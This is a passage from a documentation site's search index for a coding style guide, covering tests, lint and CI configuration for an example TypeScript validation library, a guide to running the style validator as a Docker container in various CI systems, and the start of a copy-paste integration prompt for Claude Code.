describe('min/max length', () =&gt; {\n    it('should validate min length', () =&gt; {\n      const validator = string().min(3);\n\n      expect(validator.validate('ab').success).toBe(false);\n      expect(validator.validate('abc').success).toBe(true);\n      expect(validator.validate('abcd').success).toBe(true);\n    });\n\n    it('should validate max length', () =&gt; {\n      const validator = string().max(5);\n\n      expect(validator.validate('abc').success).toBe(true);\n      expect(validator.validate('abcde').success).toBe(true);\n      expect(validator.validate('abcdef').success).toBe(false);\n    });\n\n    it('should validate exact length', () =&gt; {\n      const validator = string().length(5);\n\n      expect(validator.validate('abc').success).toBe(false);\n      expect(validator.validate('abcde').success).toBe(true);\n      expect(validator.validate('abcdef').success).toBe(false);\n    });\n  });\n\n  describe('regex patterns', () =&gt; {\n    it('should validate email', () =&gt; {\n      const validator = string().email();\n\n      expect(validator.validate('test@example.com').success).toBe(true);\n      expect(validator.validate('invalid-email').success).toBe(false);\n    });\n\n    it('should validate URL', () =&gt; {\n      const validator = string().url();\n\n      expect(validator.validate('https://example.com').success).toBe(true);\n      expect(validator.validate('not-a-url').success).toBe(false);\n    });\n\n    it('should validate custom regex', () =&gt; {\n      const validator = string().regex(/^[A-Z]+$/);\n\n      expect(validator.validate('ABC').success).toBe(true);\n      expect(validator.validate('abc').success).toBe(false);\n    });\n  });\n\n  describe('trim', () =&gt; {\n    it('should trim whitespace', () =&gt; {\n      const validator = string().trim();\n      const result = validator.validate('  hello  ');\n\n      expect(result.success).toBe(true);\n      if (result.success) {\n        expect(result.data).toBe('hello');\n      }\n    });\n  });\n\n  describe('optional/nullable', () =&gt; {\n    it('should accept undefined when optional', () =&gt; {\n      const validator = string().optional();\n\n      expect(validator.validate(undefined).success).toBe(true);\n      expect(validator.validate('hello').success).toBe(true);\n    });\n\n    it('should accept null when nullable', () =&gt; {\n      const validator = string().nullable();\n\n      expect(validator.validate(null).success).toBe(true);\n      expect(validator.validate('hello').success).toBe(true);\n    });\n  });\n\n  describe('default values', () =&gt; {\n    it('should use default for undefined', () =&gt; {\n      const validator = string().optional().default('default');\n      const result = validator.validate(undefined);\n\n      expect(result.success).toBe(true);\n      if (result.success) {\n        expect(result.data).toBe('default');\n      }\n    });\n  });\n\n  describe('type guards', () =&gt; {\n    it('should work as type guard', () =&gt; {\n      const validator = string().email();\n      const input: unknown = 'test@example.com';\n\n      if (validator.is(input)) {\n        // TypeScript knows input is string here\n        expect(input.toLowerCase()).toBe('test@example.com');\n      }\n    });\n  });\n\n  describe('parse method', () =&gt; {\n    it('should return value on success', () =&gt; {\n      const validator = string();\n      expect(validator.parse('hello')).toBe('hello');\n    });\n\n    it('should throw on error', () =&gt; {\n      const validator = string();\n      expect(() =&gt; validator.parse(123)).toThrow();\n    });\n  });\n});\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#testsvalidatorsobjecttestts","title":"tests/validators/object.test.ts","text":"<pre><code>import { describe, it, expect } from 'vitest';\nimport { object, string, number } from '../../src';\n\ndescribe('ObjectValidator', () =&gt; {\n  it('should validate object shape', () =&gt; {\n    const validator = object({\n      name: string(),\n      age: number().int().nonnegative(),\n    });\n\n    const result = validator.validate({\n      name: 'John',\n      age: 30,\n    });\n\n    expect(result.success).toBe(true);\n    if (result.success) {\n      expect(result.data.name).toBe('John');\n      expect(result.data.age).toBe(30);\n    }\n  });\n\n  it('should reject invalid object', () =&gt; {\n    const validator = object({\n      name: string(),\n      age: number(),\n    });\n\n    const result = validator.validate({\n      name: 'John',\n      age: 'not a number',\n    });\n\n    expect(result.success).toBe(false);\n  });\n\n  it('should include field path in errors', () =&gt; {\n    const validator = object({\n      user: object({\n        name: string().min(3),\n      }),\n    });\n\n    const result = validator.validate({\n      user: { name: 'ab' },\n    });\n\n    expect(result.success).toBe(false);\n    if (!result.success) {\n      expect(result.errors[0]?.path).toEqual(['user', 'name']);\n    }\n  });\n\n  it('should infer types correctly', () =&gt; {\n    const validator = object({\n      name: string(),\n      age: number(),\n      email: string().email().optional(),\n    });\n\n    type User = (typeof validator) extends { parse: (input: unknown) =&gt; infer T } ? T : never;\n\n    const user: User = {\n      name: 'John',\n      age: 30,\n      email: 'john@example.com',\n    };\n\n    expect(validator.parse(user)).toEqual(user);\n  });\n});\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#testsintegrationtestts","title":"tests/integration.test.ts","text":"<pre><code>import { describe, it, expect } from 'vitest';\nimport { object, string, number, array, type Infer } from '../src';\n\ndescribe('Integration', () =&gt; {\n  it('should validate complex nested schema', () =&gt; {\n    const addressSchema = object({\n      street: string(),\n      city: string(),\n      zipCode: string().regex(/^\\d{5}$/),\n    });\n\n    const userSchema = object({\n      id: string(),\n      name: string().min(2).max(50),\n      email: string().email(),\n      age: number().int().min(18).max(120),\n      address: addressSchema,\n      tags: array(string()).min(1).max(5),\n    });\n\n    type User = Infer&lt;typeof userSchema&gt;;\n\n    const validUser: unknown = {\n      id: '123',\n      name: 'John Doe',\n      email: 'john@example.com',\n      age: 30,\n      address: {\n        street: '123 Main St',\n        city: 'New York',\n        zipCode: '10001',\n      },\n      tags: ['developer', 'typescript'],\n    };\n\n    const result = userSchema.validate(validUser);\n    expect(result.success).toBe(true);\n\n    if (result.success) {\n      const user: User = result.data;\n      expect(user.name).toBe('John Doe');\n      expect(user.address.city).toBe('New York');\n    }\n  });\n\n  it('should validate API response schema', () =&gt; {\n    const apiResponseSchema = object({\n      data: array(\n        object({\n          id: number(),\n          title: string(),\n          completed: boolean(),\n        })\n      ),\n      pagination: object({\n        page: number().int().positive(),\n        pageSize: number().int().positive(),\n        total: number().int().nonnegative(),\n      }),\n    });\n\n    const response: unknown = {\n      data: [\n        { id: 1, title: 'Task 1', completed: false },\n        { id: 2, title: 'Task 2', completed: true },\n      ],\n      pagination: {\n        page: 1,\n        pageSize: 10,\n        total: 2,\n      },\n    };\n\n    const result = apiResponseSchema.validate(response);\n    expect(result.success).toBe(true);\n  });\n});\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#linting-and-formatting","title":"Linting and Formatting","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#eslintrcjson","title":".eslintrc.json","text":"<pre><code>{\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:@typescript-eslint/recommended-requiring-type-checking\",\n    \"prettier\"\n  ],\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 2022,\n    \"sourceType\": \"module\",\n    \"project\": \"./tsconfig.json\"\n  },\n  \"plugins\": [\"@typescript-eslint\"],\n  \"rules\": {\n    \"@typescript-eslint/no-explicit-any\": \"error\",\n    \"@typescript-eslint/no-unused-vars\": [\"error\", { \"argsIgnorePattern\": \"^_\" }],\n    \"@typescript-eslint/explicit-function-return-type\": \"off\",\n    \"@typescript-eslint/explicit-module-boundary-types\": \"off\",\n    \"@typescript-eslint/no-non-null-assertion\": \"error\",\n    \"@typescript-eslint/no-floating-promises\": \"error\"\n  },\n  \"ignorePatterns\": [\"dist\", \"node_modules\", \"*.config.ts\"]\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#prettierrcjson","title":".prettierrc.json","text":"<pre><code>{\n  \"printWidth\": 100,\n  \"tabWidth\": 2,\n  \"useTabs\": false,\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"trailingComma\": \"es5\",\n  \"bracketSpacing\": true,\n  \"arrowParens\": \"always\"\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#cicd-pipeline","title":"CI/CD Pipeline","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#githubworkflowsciyml","title":".github/workflows/ci.yml","text":"<pre><code>name: CI\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        node-version: [18.x, 20.x, 21.x]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install pnpm\n        uses: pnpm/action-setup@v2\n        with:\n          version: 8\n\n      - name: Use Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'pnpm'\n\n      - name: Install dependencies\n        run: pnpm install --frozen-lockfile\n\n      - name: Type check\n        run: pnpm type-check\n\n      - name: Lint\n        run: pnpm lint\n\n      - name: Run tests\n        run: pnpm test:coverage\n\n      - name: Upload coverage to Codecov\n        uses: codecov/codecov-action@v3\n        with:\n          files: ./coverage/lcov.info\n          flags: unittests\n\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install pnpm\n        uses: pnpm/action-setup@v2\n        with:\n          version: 8\n\n      - name: Use Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20.x\n          cache: 'pnpm'\n\n      - name: Install dependencies\n        run: pnpm install --frozen-lockfile\n\n      - name: Build\n        run: pnpm build\n\n      - name: Check bundle size\n        run: |\n          ls -lh dist/\n          du -sh dist/\n\n  publish:\n    needs: [test, build]\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install pnpm\n        uses: pnpm/action-setup@v2\n        with:\n          version: 8\n\n      - name: Use Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20.x\n          cache: 'pnpm'\n          registry-url: 'https://registry.npmjs.org'\n\n      - name: Install dependencies\n        run: pnpm install --frozen-lockfile\n\n      - name: Build\n        run: pnpm build\n\n      - name: Publish to NPM\n        run: pnpm publish --access public\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#documentation","title":"Documentation","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#readmemd","title":"README.md","text":"<pre><code>## ts-validator\n\nLightweight, type-safe validation library for TypeScript with zero dependencies.\n\n## Features\n\n- \u2705 Type-safe validation with full TypeScript support\n- \u2705 Chainable API for building complex validators\n- \u2705 Zero runtime dependencies\n- \u2705 Tree-shakeable (ESM + CommonJS)\n- \u2705 Comprehensive error messages\n- \u2705 Type guards for narrowing\n- \u2705 Support for optional, nullable, and default values\n\n## Installation\n\n```bash\nnpm install ts-validator\n## or\nyarn add ts-validator\n## or\npnpm add ts-validator\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#quick-start","title":"Quick Start","text":"<pre><code>import { object, string, number, array } from 'ts-validator';\n\n// Define a schema\nconst userSchema = object({\n  name: string().min(2).max(50),\n  email: string().email(),\n  age: number().int().min(18),\n  tags: array(string()).optional(),\n});\n\n// Validate data\nconst result = userSchema.validate({\n  name: 'John Doe',\n  email: 'john@example.com',\n  age: 30,\n});\n\nif (result.success) {\n  console.log('Valid user:', result.data);\n} else {\n  console.error('Validation errors:', result.errors);\n}\n\n// Or use parse (throws on error)\nconst user = userSchema.parse(data);\n\n// Type inference\ntype User = typeof userSchema extends { parse: (input: unknown) =&gt; infer T } ? T : never;\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#api-reference","title":"API Reference","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#string-validators","title":"String Validators","text":"<pre><code>string()                    // Basic string validation\n  .min(3)                  // Minimum length\n  .max(50)                 // Maximum length\n  .length(10)              // Exact length\n  .email()                 // Email validation\n  .url()                   // URL validation\n  .regex(/pattern/)        // Custom regex\n  .trim()                  // Trim whitespace\n  .optional()              // Allow undefined\n  .nullable()              // Allow null\n  .default('value')        // Default value\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#number-validators","title":"Number Validators","text":"<pre><code>number()                    // Basic number validation\n  .min(0)                  // Minimum value\n  .max(100)                // Maximum value\n  .int()                   // Integer only\n  .positive()              // Positive numbers only\n  .nonnegative()           // Non-negative numbers\n  .optional()              // Allow undefined\n  .nullable()              // Allow null\n  .default(0)              // Default value\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#object-validators","title":"Object Validators","text":"<pre><code>object({                    // Object shape validation\n  name: string(),\n  age: number(),\n})\n  .optional()              // Allow undefined\n  .nullable()              // Allow null\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#array-validators","title":"Array Validators","text":"<pre><code>array(string())             // Array of strings\n  .min(1)                  // Minimum items\n  .max(10)                 // Maximum items\n  .length(5)               // Exact length\n  .unique()                // Unique items only\n  .optional()              // Allow undefined\n  .nullable()              // Allow null\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#license","title":"License","text":"<p>MIT \u00a9 Tyler Dukes</p>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#key-takeaways","title":"Key Takeaways","text":"<p>This TypeScript library example demonstrates:</p> <ol> <li>Modern Package Configuration: Dual ESM/CommonJS builds with proper exports</li> <li>Type Safety: Full TypeScript support with generics and type inference</li> <li>Developer Experience: Chainable API, type guards, and helpful error messages</li> <li>Testing: Comprehensive test coverage with Vitest</li> <li>Build Pipeline: Optimized bundling with tsup</li> <li>CI/CD: Automated testing, linting, and publishing with GitHub Actions</li> <li>Documentation: Clear README with examples and API reference</li> <li>Maintainability: ESLint + Prettier + strict TypeScript configuration</li> </ol>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#references","title":"References","text":"<ul> <li>TypeScript Handbook</li> <li>tsup Documentation</li> <li>Vitest Documentation</li> <li>pnpm Documentation</li> <li>NPM Package Best Practices</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"06_container/usage/","title":"Container Usage Guide","text":"<p>The Coding Style Guide Validator is available as a containerized tool, making it easy to integrate validation into any repository without installing dependencies locally.</p>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#quick-start","title":"Quick Start","text":"","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#basic-usage","title":"Basic Usage","text":"<pre><code>## Run full validation on current directory\ndocker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest validate\n\n## Run linters only\ndocker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest lint\n\n## Format code in-place\ndocker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest format\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#available-commands","title":"Available Commands","text":"","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#validate-default","title":"<code>validate</code> (default)","text":"<p>Runs all validation checks:</p> <ul> <li>Metadata validation</li> <li>Linters (Python, YAML, Shell, etc.)</li> <li>Documentation build (if <code>mkdocs.yml</code> present)</li> </ul> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest validate\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#lint","title":"<code>lint</code>","text":"<p>Runs linters only without building documentation:</p> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest lint\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#format","title":"<code>format</code>","text":"<p>Auto-formats code (Python with Black, Terraform):</p> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest format\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#docs","title":"<code>docs</code>","text":"<p>Builds and validates MkDocs documentation:</p> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest docs\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#metadata","title":"<code>metadata</code>","text":"<p>Validates <code>@module</code> metadata tags:</p> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest metadata\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#using-with-docker-compose","title":"Using with Docker Compose","text":"<p>Create a <code>docker-compose.yml</code> in your repository:</p> <pre><code>version: '3.8'\n\nservices:\n  validate:\n    image: ghcr.io/tydukes/coding-style-guide:latest\n    volumes:\n      - .:/workspace\n    command: validate\n</code></pre> <p>Then run:</p> <pre><code>## Full validation\ndocker-compose run --rm validate\n\n## Or specify command\ndocker-compose run --rm validate lint\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#github-actions-integration","title":"GitHub Actions Integration","text":"","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#using-the-reusable-action","title":"Using the Reusable Action","text":"<p>Add to your <code>.github/workflows/ci.yml</code>:</p> <pre><code>name: CI\n\non: [push, pull_request]\n\njobs:\n  validate-coding-standards:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Validate coding standards\n        uses: tydukes/coding-style-guide/.github/actions/validate@main\n        with:\n          mode: validate\n          path: .\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#action-inputs","title":"Action Inputs","text":"Input Description Default Required <code>mode</code> Validation mode: validate, lint, format, docs, metadata <code>validate</code> No <code>path</code> Path to validate <code>.</code> No <code>image</code> Container image to use <code>ghcr.io/tydukes/coding-style-guide:latest</code> No <code>strict</code> Enable strict mode <code>false</code> No <code>continue-on-error</code> Continue even if validation fails <code>false</code> No","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#using-container-directly","title":"Using Container Directly","text":"<pre><code>name: CI\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Validate coding standards\n        run: |\n          docker run --rm -v $PWD:/workspace \\\n            ghcr.io/tydukes/coding-style-guide:latest validate\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#cli-wrapper-script","title":"CLI Wrapper Script","text":"<p>For easier local usage, use the wrapper script:</p> <pre><code>## Download wrapper script\ncurl -sSL https://raw.githubusercontent.com/tydukes/coding-style-guide/main/scripts/validate-container.sh \\\n  -o validate-style.sh &amp;&amp; chmod +x validate-style.sh\n\n## Run validation\n./validate-style.sh validate\n\n## Run with custom workspace\n./validate-style.sh lint --workspace /path/to/repo\n\n## Use local image\n./validate-style.sh validate --image coding-style-guide:local\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#wrapper-options","title":"Wrapper Options","text":"<pre><code>./validate-style.sh [COMMAND] [OPTIONS]\n\nCommands:\n  validate    Run all validation checks (default)\n  lint        Run linters only\n  format      Auto-format code\n  docs        Build and validate documentation\n  metadata    Validate @module metadata tags\n\nOptions:\n  --workspace DIR     Directory to validate (default: current directory)\n  --image IMAGE       Container image to use\n  --strict            Fail on warnings\n  --debug             Enable debug output\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#environment-variables","title":"Environment Variables","text":"Variable Description Default <code>STRICT</code> Fail on warnings <code>false</code> <code>DEBUG</code> Enable debug output <code>false</code> <code>VALIDATOR_IMAGE</code> Override container image <code>ghcr.io/tydukes/coding-style-guide:latest</code> <code>VALIDATOR_WORKSPACE</code> Override workspace path Current directory","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#pre-commit-hook-integration","title":"Pre-commit Hook Integration","text":"<p>Add to <code>.pre-commit-config.yaml</code>:</p> <pre><code>repos:\n  - repo: local\n    hooks:\n      - id: coding-style-validator\n        name: Validate Coding Standards\n        entry: docker run --rm -v $(pwd):/workspace ghcr.io/tydukes/coding-style-guide:latest\n        args: [lint]\n        language: system\n        pass_filenames: false\n        always_run: true\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#gitlab-ci-integration","title":"GitLab CI Integration","text":"<p>Add to <code>.gitlab-ci.yml</code>:</p> <pre><code>validate-coding-standards:\n  image: docker:latest\n  services:\n    - docker:dind\n  script:\n    - docker run --rm -v $CI_PROJECT_DIR:/workspace\n        ghcr.io/tydukes/coding-style-guide:latest validate\n  only:\n    - merge_requests\n    - main\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#jenkins-integration","title":"Jenkins Integration","text":"<p>Add to <code>Jenkinsfile</code>:</p> <pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Validate Coding Standards') {\n            steps {\n                script {\n                    docker.image('ghcr.io/tydukes/coding-style-guide:latest').inside {\n                        sh 'validate'\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#building-locally","title":"Building Locally","text":"<p>To build and test locally:</p> <pre><code>## Build image\ndocker build -t coding-style-guide:local .\n\n## Test with docker-compose\ndocker-compose run --rm validator\n\n## Or run directly\ndocker run --rm -v $(pwd):/workspace coding-style-guide:local validate\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#troubleshooting","title":"Troubleshooting","text":"","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#permission-issues","title":"Permission Issues","text":"<p>If you encounter permission issues with mounted volumes:</p> <pre><code>## Run as current user\ndocker run --rm -v $(pwd):/workspace \\\n  --user $(id -u):$(id -g) \\\n  ghcr.io/tydukes/coding-style-guide:latest validate\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#missing-files","title":"Missing Files","text":"<p>Ensure your repository is properly mounted:</p> <pre><code>## Verify mount\ndocker run --rm -v $(pwd):/workspace \\\n  ghcr.io/tydukes/coding-style-guide:latest ls -la /workspace\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#debug-mode","title":"Debug Mode","text":"<p>Enable debug output:</p> <pre><code>docker run --rm -v $(pwd):/workspace \\\n  -e DEBUG=true \\\n  ghcr.io/tydukes/coding-style-guide:latest validate\n</code></pre>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#image-tags","title":"Image Tags","text":"<ul> <li><code>latest</code> - Latest stable release from main branch</li> <li><code>v1.0.0</code> - Specific version tags</li> <li><code>v1.0</code> - Major.minor tags</li> <li><code>v1</code> - Major version tags</li> <li><code>main</code> - Latest commit on main branch</li> </ul>","tags":["docker","containers","validation","cicd","integration"]},{"location":"06_container/usage/#support","title":"Support","text":"<p>For issues or questions:</p> <ul> <li>GitHub Issues: https://github.com/tydukes/coding-style-guide/issues</li> <li>Documentation: https://tydukes.github.io/coding-style-guide/</li> </ul>","tags":["docker","containers","validation","cicd","integration"]},{"location":"07_integration/integration_prompt/","title":"Integration Guide","text":"<p>Use this prompt to quickly integrate the coding style guide validator into any codebase.</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#copy-paste-prompt-for-claude-code","title":"Copy-Paste Prompt for Claude Code","text":"<pre><code>I need to integrate the coding style guide validator into this repository. The validator is\navailable as a containerized tool that can be used via GitHub Actions, locally with Docker,\nor through a Makefile.\n\nPlease implement the following:\n\n## 1. GitHub Actions Integration (Recommended)\n\nCreate \\`.github/workflows/validate-coding-standards.yml\\` with:\n\n\\`\\`\\`yaml\nname: Validate Coding Standards\n\n\"on\":\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Validate coding standards\n        uses: tydukes/coding-style-guide/.github/actions/validate@v1.0.0\n        with:\n          mode: validate\n          path: .\n\\`\\`\\`\n\n## 2. Local Development Support\n\n### Option A: Create a Makefile\n\nAdd these targets to the repository \\`Makefile\\` (or create one):\n\n\\`\\`\\`makefile\n## Coding style validation targets\n.PHONY: validate lint format validate-docs\n\nIMAGE ?= ghcr.io/tydukes/coding-style-guide:v1.0.0\n\nvalidate: ## Run full coding standards validation\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) validate\n\nlint: ## Run linters only\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) lint\n\nformat: ## Auto-format code\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) format\n\nvalidate-docs: ## Validate documentation (if mkdocs.yml exists)\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) docs\n\\`\\`\\`\n\n### Option B: Create a Shell Script\n\nCreate \\`scripts/validate.sh\\`:\n\n\\`\\`\\`bash\n#!/usr/bin/env bash\n## Validate coding standards using containerized validator\n\nset -euo pipefail\n\nIMAGE=\"${VALIDATOR_IMAGE:-ghcr.io/tydukes/coding-style-guide:v1.0.0}\"\nCOMMAND=\"${1:-validate}\"\n\ndocker run --rm -v \"$(pwd):/workspace\" \"${IMAGE}\" \"${COMMAND}\"\n\\`\\`\\`\n\nMake it executable: \\`chmod +x scripts/validate.sh\\`\n\n## 3. Pre-commit Hook (Optional)\n\nIf the repository uses pre-commit, add to \\`.pre-commit-config.yaml\\`:\n\n\\`\\`\\`yaml\nrepos:\n  - repo: local\n    hooks:\n      - id: coding-style-validator\n        name: Validate Coding Standards\n        entry: docker run --rm -v $(pwd):/workspace ghcr.io/tydukes/coding-style-guide:v1.0.0\n        args: [lint]\n        language: system\n        pass_filenames: false\n        always_run: true\n\\`\\`\\`\n\n## 4. Documentation\n\nUpdate the repository README.md with a \"Code Quality\" section:\n\n\\`\\`\\`markdown\n## Code Quality\n\nThis repository uses the [Coding Style Guide](https://github.com/tydukes/coding-style-guide)\nvalidator to ensure consistent code quality.\n\n### Running Validation Locally\n\nUsing Docker:\n\\`\\`\\`bash\ndocker run --rm -v $(pwd):/workspace ghcr.io/tydukes/coding-style-guide:v1.0.0 validate\n\\`\\`\\`\n\nUsing Makefile:\n\\`\\`\\`bash\nmake validate  # Full validation\nmake lint      # Linters only\nmake format    # Auto-format\n\\`\\`\\`\n\nUsing shell script:\n\\`\\`\\`bash\n./scripts/validate.sh validate\n\\`\\`\\`\n\n### Available Commands\n\n- \\`validate\\` - Run all checks (linting, docs, metadata)\n- \\`lint\\` - Run linters only\n- \\`format\\` - Auto-format code\n- \\`docs\\` - Validate documentation (if mkdocs.yml present)\n- \\`metadata\\` - Check @module metadata tags\n\\`\\`\\`\n\n## 5. GitLab CI (If Applicable)\n\nIf this is a GitLab repository, create/update \\`.gitlab-ci.yml\\`:\n\n\\`\\`\\`yaml\nstages:\n  - validate\n\nvalidate-coding-standards:\n  stage: validate\n  image: docker:latest\n  services:\n    - docker:dind\n  script:\n    - docker run --rm -v $CI_PROJECT_DIR:/workspace\n        ghcr.io/tydukes/coding-style-guide:v1.0.0 validate\n  only:\n    - merge_requests\n    - main\n    - develop\n\\`\\`\\`\n\n## Requirements\n\n- Ensure Docker is available for local development\n- For GitHub Actions, no additional setup needed\n- For GitLab CI, Docker-in-Docker (dind) service required\n\n## Implementation Instructions\n\n1. Create the GitHub Actions workflow file\n2. Choose ONE of the local development options (Makefile OR shell script)\n3. Update the README with code quality section\n4. (Optional) Add pre-commit hook if the repo uses pre-commit\n5. Test locally: \\`make validate\\` or \\`./scripts/validate.sh\\`\n6. Commit and push to trigger CI validation\n\nPlease implement all applicable options based on the repository structure and platform.\n\\`\\`\\`\n\n---\n\n## Alternative: Minimal Integration Prompt\n\nIf you only want GitHub Actions integration:\n\n```markdown\nAdd coding style validation to this repository using the containerized validator.\n\nCreate \\`.github/workflows/validate-coding-standards.yml\\`:\n\n\\`\\`\\`yaml\nname: Validate Coding Standards\n\n\"on\":\n  push:\n    branches: [main, develop]\n  pull_request:\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: tydukes/coding-style-guide/.github/actions/validate@v1.0.0\n        with:\n          mode: validate\n\\`\\`\\`\n\nAdd a Makefile with validation targets:\n\n\\`\\`\\`makefile\n.PHONY: validate lint format\n\nIMAGE ?= ghcr.io/tydukes/coding-style-guide:v1.0.0\n\nvalidate:\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) validate\n\nlint:\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) lint\n\nformat:\n @docker run --rm -v $$(pwd):/workspace $(IMAGE) format\n\\`\\`\\`\n\nUpdate README.md to document the validation process.\n\nTest locally with: \\`make validate\\`\n\\`\\`\\`\n\n---\n\n## Platform-Specific Prompts\n\n### For GitHub Repositories\n\n```markdown\nIntegrate the coding style guide validator into this GitHub repository:\n\n1. Add GitHub Actions workflow at \\`.github/workflows/validate-coding-standards.yml\\`\n   - Use the reusable action: \\`tydukes/coding-style-guide/.github/actions/validate@v1.0.0\\`\n   - Trigger on push to main/develop and all pull requests\n   - Use validation mode: \\`validate\\`\n\n2. Add Makefile targets for local validation:\n   - \\`make validate\\` - full validation\n   - \\`make lint\\` - linters only\n   - \\`make format\\` - auto-format code\n\n3. Update README.md with instructions on running validation locally\n\n4. Ensure the workflow is configured to run as a required status check (mention this in PR)\n\nUse container: \\`ghcr.io/tydukes/coding-style-guide:v1.0.0\\`\n\\`\\`\\`\n\n### For GitLab Repositories\n\n```markdown\nIntegrate the coding style guide 